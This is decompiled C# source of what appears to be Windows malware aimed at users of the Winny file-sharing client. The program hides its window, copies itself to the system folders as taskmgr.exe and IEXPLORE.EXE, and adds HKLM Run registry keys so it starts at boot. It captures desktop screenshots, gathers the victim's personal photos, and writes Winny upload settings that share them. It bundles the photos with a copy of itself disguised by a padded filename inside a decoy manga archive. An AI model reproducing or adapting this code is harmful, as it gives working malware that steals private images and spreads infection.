using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using java.io;
using java.util.zip;

namespace WindowsApplication2;

public class Form1 : Form
{
	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private IContainer components;

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer1 != null)
			{
				_Timer1.Elapsed -= Timer1_Elapsed;
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.Elapsed += Timer1_Elapsed;
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label1 == null)
			{
			}
			_Label1 = value;
			if (_Label1 != null)
			{
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		ResourceManager resourceManager = new ResourceManager(typeof(Form1));
		Timer1 = new Timer();
		Label1 = new Label();
		((ISupportInitialize)Timer1).BeginInit();
		((Control)this).SuspendLayout();
		Timer1.Enabled = true;
		Timer1.Interval = 10.0;
		Timer1.SynchronizingObject = (ISynchronizeInvoke?)this;
		Label label = Label1;
		Point location = new Point(48, 40);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(72, 32);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		((Control)Label1).set_Text("Label1");
		size = new Size(5, 12);
		((Form)this).set_AutoScaleBaseSize(size);
		size = new Size(292, 273);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_Icon((Icon)resourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)Timer1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	public void Timer1_Elapsed(object sender, ElapsedEventArgs e)
	{
		//IL_0728: Unknown result type (might be due to invalid IL or missing references)
		//IL_072f: Expected O, but got Unknown
		//IL_0735: Unknown result type (might be due to invalid IL or missing references)
		//IL_073c: Expected O, but got Unknown
		//IL_076c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0773: Expected O, but got Unknown
		//IL_0792: Unknown result type (might be due to invalid IL or missing references)
		//IL_0799: Expected O, but got Unknown
		int try0001_dispatch = -1;
		checked
		{
			int num3 = default(int);
			int num = default(int);
			int num4 = default(int);
			string folderPath = default(string);
			string directoryName = default(string);
			object executablePath = default(object);
			string subkey = default(string);
			string name = default(string);
			string name2 = default(string);
			string value = default(string);
			string value2 = default(string);
			RegistryKey registryKey = default(RegistryKey);
			RegistryKey registryKey2 = default(RegistryKey);
			string text = default(string);
			string[] array = default(string[]);
			string[] filesMostDeep = default(string[]);
			long num5 = default(long);
			string[] array2 = default(string[]);
			int num6 = default(int);
			string text2 = default(string);
			string[] array3 = default(string[]);
			int num7 = default(int);
			string text3 = default(string);
			long num8 = default(long);
			long num9 = default(long);
			string text4 = default(string);
			string[] array4 = default(string[]);
			long num10 = default(long);
			FileOutputStream val = default(FileOutputStream);
			ZipOutputStream val2 = default(ZipOutputStream);
			string[] array5 = default(string[]);
			int num11 = default(int);
			string text5 = default(string);
			string fileName = default(string);
			ZipEntry val3 = default(ZipEntry);
			FileInputStream val4 = default(FileInputStream);
			sbyte[] array6 = default(sbyte[]);
			int num12 = default(int);
			StreamWriter streamWriter = default(StreamWriter);
			Exception ex = default(Exception);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					string[] array7;
					string[] array8;
					int num13;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0009;
					case 2182:
						{
							int num2 = unchecked(num + 1);
							num = 0;
							switch (num2)
							{
							case 0:
								break;
							case 1:
								goto IL_0009;
							case 2:
								goto IL_0015;
							case 3:
								goto IL_0021;
							case 4:
								goto IL_002a;
							case 5:
								goto IL_0045;
							case 6:
								goto IL_0060;
							case 7:
								goto IL_006a;
							case 8:
								goto IL_0074;
							case 9:
								goto IL_007e;
							case 10:
								goto IL_008f;
							case 11:
								goto IL_00a0;
							case 12:
								goto IL_00b2;
							case 13:
								goto IL_00c4;
							case 14:
								goto IL_00d2;
							case 15:
								goto IL_00e0;
							case 16:
								goto IL_00eb;
							case 17:
								goto IL_00f5;
							case 18:
								goto IL_010b;
							case 19:
								goto IL_0123;
							case 20:
								goto IL_013d;
							case 21:
								goto IL_0154;
							case 22:
								goto IL_016c;
							case 23:
								goto IL_017a;
							case 24:
								goto IL_0194;
							case 25:
								goto IL_01de;
							case 26:
							case 27:
								goto IL_01f0;
							case 28:
								goto IL_01f9;
							case 29:
								goto IL_0213;
							case 30:
								goto IL_022b;
							case 31:
								goto IL_0242;
							case 32:
								goto IL_0252;
							case 33:
								goto IL_027c;
							case 34:
								goto IL_028b;
							case 35:
								goto IL_02a2;
							case 36:
								goto IL_02b4;
							case 37:
								goto IL_02d3;
							case 38:
								goto IL_02fa;
							case 39:
								goto IL_0313;
							case 40:
								goto IL_0330;
							case 41:
								goto IL_0355;
							case 42:
								goto IL_03a2;
							case 43:
								goto IL_03ad;
							case 44:
								goto IL_03b7;
							case 45:
								goto IL_03c6;
							case 46:
								goto IL_0422;
							case 47:
								goto IL_042b;
							case 48:
								goto IL_042f;
							case 49:
								goto IL_0459;
							case 50:
								goto IL_0468;
							case 51:
								goto IL_047c;
							case 52:
								goto IL_048e;
							case 53:
								goto IL_04ad;
							case 54:
								goto IL_04b7;
							case 55:
								goto IL_04c3;
							case 56:
								goto IL_04ee;
							case 57:
								goto IL_0503;
							case 58:
								goto IL_056b;
							case 59:
								goto IL_0583;
							case 60:
								goto IL_0597;
							case 61:
								goto IL_05cd;
							case 62:
								goto IL_0624;
							case 63:
								goto IL_0634;
							case 64:
								goto IL_0649;
							case 65:
								goto IL_06b6;
							case 66:
								goto IL_06d1;
							case 67:
								goto IL_0701;
							case 68:
								goto IL_0722;
							case 69:
								goto IL_072f;
							case 70:
								goto IL_073c;
							case 71:
								goto IL_0759;
							case 72:
								goto IL_0766;
							case 73:
								goto IL_0773;
							case 74:
								goto IL_077f;
							case 75:
								goto IL_078c;
							case 76:
								goto IL_0799;
							case 79:
								goto IL_07ab;
							case 80:
								goto IL_07c2;
							case 82:
							case 83:
								goto IL_07cb;
							case 81:
							case 85:
								goto IL_07dd;
							case 86:
								goto IL_07e8;
							case 87:
								goto IL_07f3;
							case 88:
								goto IL_07fd;
							case 77:
							case 78:
							case 84:
								goto IL_0806;
							case 89:
								goto IL_080c;
							case 90:
								goto IL_0817;
							case 91:
							case 92:
							case 93:
								goto IL_0822;
							case 94:
								goto IL_0834;
							case 95:
								goto IL_084c;
							case 96:
								goto IL_0860;
							case 97:
							case 98:
								goto IL_0872;
							case 99:
								goto end_IL_0001;
							case 100:
							case 101:
							case 102:
								goto end_IL_0001_2;
							default:
								goto IL_0a76;
							}
							goto default;
						}
						IL_0009:
						num4 = 1;
						folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
						goto IL_0015;
						IL_0015:
						num4 = 2;
						directoryName = Path.GetDirectoryName(folderPath);
						goto IL_0021;
						IL_0021:
						num4 = 3;
						executablePath = Application.get_ExecutablePath();
						goto IL_002a;
						IL_002a:
						num4 = 4;
						File.Copy(StringType.FromObject(executablePath), directoryName + "\\taskmgr.exe", overwrite: true);
						goto IL_0045;
						IL_0045:
						num4 = 5;
						File.Copy(StringType.FromObject(executablePath), folderPath + "\\config\\IEXPLORE.EXE", overwrite: true);
						goto IL_0060;
						IL_0060:
						num4 = 6;
						subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
						goto IL_006a;
						IL_006a:
						num4 = 7;
						name = "taskmgr";
						goto IL_0074;
						IL_0074:
						num4 = 8;
						name2 = "IEXPLORE";
						goto IL_007e;
						IL_007e:
						num4 = 9;
						value = directoryName + "\\taskmgr.exe -kira";
						goto IL_008f;
						IL_008f:
						num4 = 10;
						value2 = folderPath + "\\config\\IEXPLORE.EXE -ryuk";
						goto IL_00a0;
						IL_00a0:
						num4 = 11;
						registryKey = Registry.LocalMachine.CreateSubKey(subkey);
						goto IL_00b2;
						IL_00b2:
						num4 = 12;
						registryKey2 = Registry.LocalMachine.CreateSubKey(subkey);
						goto IL_00c4;
						IL_00c4:
						num4 = 13;
						registryKey.SetValue(name, value);
						goto IL_00d2;
						IL_00d2:
						num4 = 14;
						registryKey2.SetValue(name2, value2);
						goto IL_00e0;
						IL_00e0:
						num4 = 15;
						registryKey.Close();
						goto IL_00eb;
						IL_00eb:
						num4 = 16;
						Console.WriteLine(value);
						goto IL_00f5;
						IL_00f5:
						num4 = 17;
						Directory.CreateDirectory(folderPath + "\\1035");
						goto IL_010b;
						IL_010b:
						num4 = 18;
						GetHostNameSample.tcnt++;
						goto IL_0123;
						IL_0123:
						num4 = 19;
						if (StringType.StrCmp(GetHostNameSample.cline, "-ryuk", false) == 0)
						{
							goto IL_013d;
						}
						goto IL_01f9;
						IL_013d:
						num4 = 20;
						if (GetHostNameSample.tcnt > 60L)
						{
							goto IL_0154;
						}
						goto IL_01f0;
						IL_0154:
						num4 = 21;
						Timer1.Interval = 10000.0;
						goto IL_016c;
						IL_016c:
						num4 = 22;
						SendKeys.SendWait("^{PRTSC}");
						goto IL_017a;
						IL_017a:
						num4 = 23;
						text = Strings.Format((object)DateAndTime.get_Now(), "yyMMdd_HHmm");
						goto IL_0194;
						IL_0194:
						num4 = 24;
						SaveImage(folderPath + "\\1035\\[デスノート] " + GetHostNameSample.dnsname + "のデスクトップ " + text + ".jpg", 99);
						goto IL_01de;
						IL_01de:
						num4 = 25;
						GetHostNameSample.tcnt = 0L;
						goto IL_01f0;
						IL_01f0:
						num4 = 27;
						goto end_IL_0001_2;
						IL_01f9:
						num4 = 28;
						if (StringType.StrCmp(GetHostNameSample.cline, "-kira", false) == 0)
						{
							goto IL_0213;
						}
						goto end_IL_0001_2;
						IL_0213:
						num4 = 29;
						Timer1.Interval = 10000.0;
						goto IL_022b;
						IL_022b:
						num4 = 30;
						if (GetHostNameSample.tcnt <= 6L)
						{
							break;
						}
						goto IL_0242;
						IL_0242:
						num4 = 31;
						array = new string[1000];
						goto IL_0252;
						IL_0252:
						num4 = 32;
						filesMostDeep = GetFilesMostDeep(StringType.FromChar(Strings.Chr((int)GetHostNameSample.drv)) + ":\\", "winny.exe");
						goto IL_027c;
						IL_027c:
						num4 = 33;
						num5 = 0L;
						goto IL_028b;
						IL_028b:
						num4 = 34;
						array2 = filesMostDeep;
						num6 = 0;
						goto IL_03bb;
						IL_03bb:
						if (num6 < array2.Length)
						{
							text2 = array2[num6];
							goto IL_02a2;
						}
						goto IL_03c6;
						IL_03c6:
						num4 = 45;
						if (File.Exists(folderPath + "\\1035\\[一般コミック][小畑健×" + GetHostNameSample.dnsname + "] DEATH NOTE -デスノート- 第" + StringType.FromLong(GetHostNameSample.drv - 98L) + "巻.zip"))
						{
							goto IL_0422;
						}
						goto IL_042b;
						IL_0422:
						num4 = 46;
						goto IL_0822;
						IL_042b:
						num4 = 47;
						goto IL_042f;
						IL_042f:
						num4 = 48;
						filesMostDeep = GetFilesMostDeep(StringType.FromChar(Strings.Chr((int)GetHostNameSample.drv)) + ":\\", "DSC*.jpg");
						goto IL_0459;
						IL_0459:
						num4 = 49;
						num5 = 0L;
						goto IL_0468;
						IL_0468:
						num4 = 50;
						array3 = filesMostDeep;
						num7 = 0;
						goto IL_04bb;
						IL_04bb:
						if (num7 < array3.Length)
						{
							text3 = array3[num7];
							goto IL_047c;
						}
						goto IL_04c3;
						IL_04c3:
						num4 = 55;
						Directory.CreateDirectory(folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr((int)GetHostNameSample.drv)) + "\\");
						goto IL_04ee;
						IL_04ee:
						num4 = 56;
						num8 = num5;
						num9 = 1L;
						goto IL_057d;
						IL_057d:
						if (num9 <= num8)
						{
							goto IL_0503;
						}
						goto IL_0583;
						IL_0583:
						num4 = 59;
						if (num5 > 0L)
						{
							goto IL_0597;
						}
						goto IL_0822;
						IL_0597:
						num4 = 60;
						File.Copy(StringType.FromObject(executablePath), string.Concat(folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr((int)GetHostNameSample.drv)), "\\\\メール                                                                            .exe"), overwrite: true);
						goto IL_05cd;
						IL_05cd:
						num4 = 61;
						text4 = folderPath + "\\1035\\[一般コミック][小畑健×" + GetHostNameSample.dnsname + "] DEATH NOTE -デスノート- 第" + StringType.FromLong(GetHostNameSample.drv - 98L) + "巻.zip";
						goto IL_0624;
						IL_0624:
						num4 = 62;
						array4 = new string[10000];
						goto IL_0634;
						IL_0634:
						num4 = 63;
						num10 = num5;
						num9 = 1L;
						goto IL_06c8;
						IL_06c8:
						if (num9 <= num10)
						{
							goto IL_0649;
						}
						goto IL_06d1;
						IL_06d1:
						num4 = 66;
						array4[(int)num5] = string.Concat(folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr((int)GetHostNameSample.drv)), "\\\\メール                                                                            .exe");
						goto IL_0701;
						IL_0701:
						num4 = 67;
						array4 = (string[])Utils.CopyArray((Array)array4, (Array)new string[(int)num5 + 1]);
						goto IL_0722;
						IL_0722:
						num4 = 68;
						val = new FileOutputStream(text4);
						goto IL_072f;
						IL_072f:
						num4 = 69;
						val2 = new ZipOutputStream((OutputStream)(object)val);
						goto IL_073c;
						IL_073c:
						num4 = 70;
						array5 = array4;
						num11 = 0;
						goto IL_0747;
						IL_0747:
						if (num11 < array5.Length)
						{
							text5 = array5[num11];
							goto IL_0759;
						}
						goto IL_080c;
						IL_03b7:
						num4 = 44;
						goto IL_03bb;
						IL_0759:
						num4 = 71;
						fileName = Path.GetFileName(text5);
						goto IL_0766;
						IL_0766:
						num4 = 72;
						val3 = new ZipEntry(fileName);
						goto IL_0773;
						IL_0773:
						num4 = 73;
						val3.setMethod(8);
						goto IL_077f;
						IL_077f:
						num4 = 74;
						val2.putNextEntry(val3);
						goto IL_078c;
						IL_078c:
						num4 = 75;
						val4 = new FileInputStream(text5);
						goto IL_0799;
						IL_0799:
						num4 = 76;
						array6 = new sbyte[8192];
						goto IL_0806;
						IL_0806:
						num4 = 78;
						goto IL_07ab;
						IL_07ab:
						num4 = 79;
						num12 = val4.read(array6, 0, array6.Length);
						goto IL_07c2;
						IL_07c2:
						num4 = 80;
						if (num12 > 0)
						{
							goto IL_07cb;
						}
						goto IL_07dd;
						IL_07cb:
						num4 = 83;
						val2.write(array6, 0, num12);
						goto IL_0806;
						IL_07dd:
						num4 = 85;
						val4.close();
						goto IL_07e8;
						IL_07e8:
						num4 = 86;
						val2.closeEntry();
						goto IL_07f3;
						IL_07f3:
						num4 = 87;
						num11++;
						goto IL_07fd;
						IL_07fd:
						num4 = 88;
						goto IL_0747;
						IL_080c:
						num4 = 89;
						val2.close();
						goto IL_0817;
						IL_0817:
						num4 = 90;
						val.close();
						goto IL_0822;
						IL_0649:
						num4 = 64;
						array4[(int)(num9 - 1L)] = folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr((int)GetHostNameSample.drv)) + "\\" + Strings.Format((object)num9, "000") + ".jpg";
						goto IL_06b6;
						IL_06b6:
						num4 = 65;
						num9++;
						goto IL_06c8;
						IL_0822:
						num4 = 93;
						GetHostNameSample.tcnt = 0L;
						goto IL_0834;
						IL_0834:
						num4 = 94;
						GetHostNameSample.drv++;
						goto IL_084c;
						IL_084c:
						num4 = 95;
						if (GetHostNameSample.drv == 110L)
						{
							goto IL_0860;
						}
						goto IL_0872;
						IL_0860:
						num4 = 96;
						GetHostNameSample.drv = 99L;
						goto IL_0872;
						IL_0872:
						num4 = 98;
						goto end_IL_0001_2;
						IL_0503:
						num4 = 57;
						File.Move(array[(int)num9], folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr((int)GetHostNameSample.drv)) + "\\" + Strings.Format((object)num9, "000") + ".jpg");
						goto IL_056b;
						IL_056b:
						num4 = 58;
						num9++;
						goto IL_057d;
						IL_03ad:
						num4 = 43;
						num6++;
						goto IL_03b7;
						IL_047c:
						num4 = 51;
						num5++;
						goto IL_048e;
						IL_048e:
						num4 = 52;
						array7 = array;
						num13 = (int)num5;
						array7[num13] = array[num13] + text3 + Environment.NewLine;
						goto IL_04ad;
						IL_04ad:
						num4 = 53;
						num7++;
						goto IL_04b7;
						IL_04b7:
						num4 = 54;
						goto IL_04bb;
						IL_03a2:
						num4 = 42;
						streamWriter.Close();
						goto IL_03ad;
						IL_02a2:
						num4 = 35;
						num5++;
						goto IL_02b4;
						IL_02b4:
						num4 = 36;
						array8 = array;
						num13 = (int)num5;
						array8[num13] = array[num13] + text2 + Environment.NewLine;
						goto IL_02d3;
						IL_02d3:
						num4 = 37;
						GetHostNameSample.wpash = Strings.Mid(array[(int)num5], 1, Strings.InStrRev(array[(int)num5], "\\", -1, (CompareMethod)0));
						goto IL_02fa;
						IL_02fa:
						num4 = 38;
						DeleteFile(GetHostNameSample.wpash + "UpFolder.txt", bDelReadOnly: true);
						goto IL_0313;
						IL_0313:
						num4 = 39;
						File.Create(GetHostNameSample.wpash + "UpFolder.txt").Close();
						goto IL_0330;
						IL_0330:
						num4 = 40;
						streamWriter = new StreamWriter(GetHostNameSample.wpash + "UpFolder.txt", append: false, Encoding.GetEncoding(932));
						goto IL_0355;
						IL_0355:
						num4 = 41;
						streamWriter.Write("[up]\nPath=" + folderPath + "\\1035" + "\n" + "Trip=" + "\n");
						goto IL_03a2;
						end_IL_0001:
						break;
					}
					num4 = 99;
					ProjectData.EndApp();
					end_IL_0001_2:;
				}
				catch (object obj) when ((obj is Exception && num3 != 0 && num == 0) ? true : false)
				{
					Exception obj2 = (Exception)obj;
					ProjectData.SetProjectError(obj2);
					ex = obj2;
					if (num != 0)
					{
						goto IL_0a76;
					}
					num = num4;
					switch (num3)
					{
					case 1:
						try0001_dispatch = 2182;
						break;
					default:
						throw;
					}
					continue;
				}
				break;
				IL_0a76:
				throw ex;
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}

	private static ImageCodecInfo GetEncoderInfo(string mineType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		ImageCodecInfo[] array = imageEncoders;
		int num = 0;
		ImageCodecInfo val;
		while (true)
		{
			if (num < array.Length)
			{
				val = array[num];
				if (StringType.StrCmp(val.get_MimeType(), mineType, false) == 0)
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return null;
		}
		return val;
	}

	public static void SaveImage(string fileName, int quality)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		IDataObject dataObject = Clipboard.GetDataObject();
		if (dataObject.GetDataPresent(DataFormats.Bitmap))
		{
			Bitmap val = (Bitmap)dataObject.GetData(DataFormats.Bitmap);
			EncoderParameters val2 = new EncoderParameters(1);
			EncoderParameter val3 = new EncoderParameter(Encoder.Quality, (long)quality);
			val2.get_Param()[0] = val3;
			ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
			string path = encoderInfo.get_FilenameExtension().Split(new char[1] { ';' })[0];
			path = Path.GetExtension(path)!.ToLower();
			string text = Path.ChangeExtension(fileName, path);
			((Image)val).Save(text, encoderInfo, val2);
		}
	}

	public static void DeleteFile(string nFilePath, bool bDelReadOnly)
	{
		FileInfo fileInfo = new FileInfo(nFilePath);
		if (!fileInfo.get_Exists())
		{
			return;
		}
		if ((fileInfo.Attributes & FileAttributes.ReadOnly) > (FileAttributes)0)
		{
			if (bDelReadOnly)
			{
				fileInfo.Attributes = FileAttributes.Normal;
				fileInfo.Delete();
			}
		}
		else
		{
			fileInfo.Delete();
		}
	}

	public static string[] GetFilesMostDeep(string nRootPath, string nPattern)
	{
		ArrayList arrayList = new ArrayList();
		string[] files = Directory.GetFiles(nRootPath, nPattern);
		foreach (string value in files)
		{
			arrayList.Add(value);
		}
		string[] directories = Directory.GetDirectories(nRootPath);
		string[] filesMostDeep = default(string[]);
		foreach (string text in directories)
		{
			if (StringType.StrCmp(Strings.Mid(text, 4, Strings.Len(text)), "System Volume Information", false) != 0)
			{
				filesMostDeep = GetFilesMostDeep(text, nPattern);
			}
			if (filesMostDeep != null)
			{
				arrayList.AddRange(filesMostDeep);
			}
		}
		return (string[])arrayList.ToArray(typeof(string));
	}

	private void putFileToZip(ZipOutputStream outStream, string Path)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		int num;
		BufferedInputStream val;
		CRC32 val2;
		ZipEntry val3;
		checked
		{
			num = (int)FileSystem.FileLen(Path);
			val = new BufferedInputStream((InputStream)new FileInputStream(Path));
			val2 = new CRC32();
			sbyte[] array = new sbyte[num - 1 + 1];
			if (val.read(array, 0, num) != -1)
			{
				val2.update(array, 0, num);
				outStream.write(array, 0, num);
			}
			val3 = new ZipEntry(System.IO.Path.GetFileName(Path));
			val3.setMethod(8);
		}
		val3.setSize((long)num);
		val3.setCrc(val2.getValue());
		outStream.putNextEntry(val3);
		val.close();
		outStream.closeEntry();
		((FilterOutputStream)outStream).flush();
	}
}
